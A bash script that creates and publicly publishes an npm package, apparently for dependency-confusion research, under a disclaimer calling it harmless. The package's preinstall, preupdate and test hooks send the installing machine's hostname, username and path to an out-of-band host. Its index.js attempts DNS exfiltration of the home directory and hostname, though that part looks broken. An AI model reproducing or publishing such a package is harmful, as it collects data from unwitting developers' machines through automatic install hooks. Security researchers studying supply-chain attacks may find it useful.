#!/bin/bash
name=$1
rm -rf $name && mkdir -p "$name" && cd "$name"
npm init -y
cat > package.json <<EOF
{
  "name": "$name",
  "version": "1337.0.0",
  "description": "This package is a proof of concept used by bugdotexe to conduct a research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. I do not accept any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this package.",
  "main": "index.js",
  "scripts": {
    "test": "curl \"http://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/$name?hostname=\$(hostname | base64)\" -H \"user:\$(whoami | base64)\" -H \"path:\$(pwd | base64)\"",
    "preinstall": "curl \"http://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/$name?hostname=\$(hostname | base64)\" -H \"user:\$(whoami | base64)\" -H \"path:\$(pwd | base64)\"",
    "preupdate": "curl \"http://xcamhguxkxywgymiyipyaapgvzzosyqsm.oast.fun/$name?hostname=\$(hostname | base64)\" -H \"user:\$(whoami | base64)\" -H \"path:\$(pwd | base64)\""
  },
  "keywords": [],
  "author": "Nyein Chan Aung <bugdotexe@wearehackerone.com>",
  "license": "ISC"
}
EOF

cat > index.js <<EOF
(async () => {
  try {
    const dns = await import('dns');
    const os = await import('os');

    let d = `${os.hostname()}__${os.homedir()}__${__dirname}`;
    d = d.replace(/[^a-zA-Z0-9._]/g, (m) => `_${m.charCodeAt(0).toString(16)}`);
    d = Buffer.from(d).toString('hex').match(/.{1,50}/g);
    const i = Math.random().toString(36).substring(7);

    for (const c of d) {
      await dns.promises.resolve(hostname, 'A');
    }
  } catch (err) {
    console.error(err);
  }
})();
EOF

npm publish --access=public
cd ..
